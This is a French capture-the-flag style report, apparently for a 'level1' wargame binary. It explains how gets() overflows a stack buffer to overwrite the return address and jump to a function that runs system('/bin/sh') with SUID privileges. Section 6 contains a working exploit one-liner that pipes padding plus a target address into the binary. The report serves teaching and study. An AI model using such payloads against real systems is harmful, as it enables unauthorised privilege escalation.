
---
# RAPPORT — Analyse de la faille de débordement de stack (level1)

## 1. Contexte général

Le programme contient une fonction `main` vulnérable qui appelle `gets`, laquelle écrit **sans aucune vérification de taille** dans un buffer local situé sur la stack.
Cette vulnérabilité permet à un utilisateur de **déborder du buffer**, d’écraser des métadonnées de la stack frame, et de **rediriger le flux d’exécution** vers une autre fonction du binaire (`run`).

---

## 2. Prologue de `main` et mise en place de la stack frame

Les instructions suivantes sont exécutées à l’entrée de `main` :

```asm
push ebp
mov  esp, ebp
and  $0xfffffff0, esp
sub  $0x50, esp
```

### Effets en mémoire :

1. **Sauvegarde de l’ancien EBP**

   * `push ebp` empile le frame pointer de la fonction appelante.
   * Cette valeur servira à restaurer la stack lors du retour.

2. **Création du frame pointer**

   * `mov esp, ebp` fixe un repère stable pour la fonction courante.
   * `EBP` ne bougera plus pendant toute l’exécution de `main`.

3. **Alignement de la stack**

   * `and $0xfffffff0, esp` force `ESP` à être aligné sur 16 octets.
   * Cet alignement est imposé par l’ABI et peut déplacer `ESP` de quelques octets vers le bas.
   * Ce déplacement dépend de l’état initial de la stack et **ne doit jamais être “deviné”**.

4. **Allocation des variables locales**

   * `sub $0x50, esp` réserve **80 octets** sous `EBP`.
   * Ces 80 octets constituent le buffer local (ou un ensemble de variables locales).

---

## 3. Remarques complémentaires sur la fonction `run`

- **Exécution d'un shell :** la fonction `run` appelle `system("/bin/sh")`, lançant un shell.
- **Droits du binaire :** le fichier possède les droits SUID et SGID, mode : -rwsr-s---+

Extrait d'assembleur :

```asm
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
```

L'appel à `system@plt` confirme l'exécution du shell. Grâce aux droits SUID/SGID, le shell obtient les privilèges du propriétaire du fichier.

---

## 4. Position réelle du buffer et appel à `gets`

Avant l’appel à `gets`, on observe :

```asm
lea 0x10(%esp), %eax
mov %eax, (%esp)
call gets
```

### Interprétation correcte :

* L’adresse passée à `gets` est **`ESP + 0x10`**
* Le buffer **ne commence pas exactement à `ESP`**
* Les 16 octets entre `ESP` et le début du buffer correspondent :

  * à l’espace réservé pour les arguments
  * et aux contraintes d’alignement

Le buffer commence donc **16 octets au-dessus de `ESP`**, mais reste **entièrement sous `EBP`**.

---

## 5. Organisation de la stack (avant l'overflow)

Ordre mémoire correct (adresses basses en bas, hautes en haut) :

```
(adresses hautes)
│
│ return address        ← EBP + 4
│ saved EBP             ← EBP
├──────────────────────
│ buffer[76]
│ ...
│ buffer[0]             ← début du buffer
├──────────────────────
│ ESP
(adresses basses)
```

Points essentiels :

* `buffer[0]` est à l’adresse **la plus basse**
* `buffer[76]` est à l’adresse **la plus haute**
* le débordement progresse **vers le haut**, en direction de `EBP` puis de l’adresse de retour

---

## 6. Déclenchement de la vulnérabilité

La commande suivante est injectée :

```bash
(python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
```

### Pourquoi ajouter `cat` ?

Le `; cat` permet de garder la pipe d'entrée ouverte et de relayer ce que vous tapez vers l'entrée standard du programme ciblé.

- `cat` maintient la connexion STDIN ouverte après l'envoi du payload.
- Cela évite qu'un EOF ferme immédiatement l'entrée du processus une fois le payload envoyé.
- L'exploit lance ensuite un shell (via `system` dans `run`), `cat` transmettra les commandes que vous tapez au shell, vous permettant d'interagir avec celui-ci.

Sans `cat`, la commande python écrit son payload puis ferme sa sortie : la pipe peut se fermer et le shell lancé par l'exploit risque de recevoir un EOF et de se terminer immédiatement.


### Ce que fait réellement `gets` :

* Il écrit séquentiellement :

  ```
  buffer[0], buffer[1], ..., buffer[75], buffer[76], ...
  ```
* Comme il n’y a **aucune limite**, l’écriture dépasse la fin du buffer.

### Effet précis :

* Les premiers octets remplissent le buffer
* Les octets suivants :

  * écrasent le **saved EBP**
  * puis écrasent la **return address**
* La valeur `0x08048444` remplace l’adresse de retour originale

⚠ Important :

* Les **76 octets** servent uniquement à **atteindre** la return address
* Ils **ne sont pas l’adresse de `run`**
* Le fait que 76 fonctionne est un **résultat empirique**, dépendant de l’alignement et du layout réel de la stack

---

## 7. Détournement du flux d'exécution

À la fin de `main`, les instructions suivantes sont exécutées :

```asm
leave
ret
```

### Effet :

1. `leave`

   * restaure `ESP` à partir de `EBP`
   * recharge l’ancien `EBP` (même s’il est corrompu)

2. `ret`

   * lit la valeur située à l’emplacement de la return address
   * charge cette valeur dans `EIP`

➡ `EIP = 0x08048444`
➡ le processeur saute dans la fonction `run`

---

## 8. Exploitation et élévation de privilèges

La fonction `run` :

* affiche un message via `fwrite`
* appelle `system("/bin/sh")` pour lancer un shell

Comme le binaire possède les droits SUID/SGID (voir section 3), le shell hérite des privilèges élevés, permettant d'obtenir un accès avec les droits du propriétaire du fichier.

---

## 9. Synthèse finale

> La fonction `main` alloue un buffer local sur la stack et appelle `gets` sans contrôle de taille.
> L’entrée utilisateur déborde du buffer, écrase le saved EBP puis la return address.
> Lors du retour de `main`, l’instruction `ret` charge une adresse contrôlée par l’utilisateur dans `EIP`, redirigeant l’exécution vers la fonction `run`, qui appelle `system`.

---
 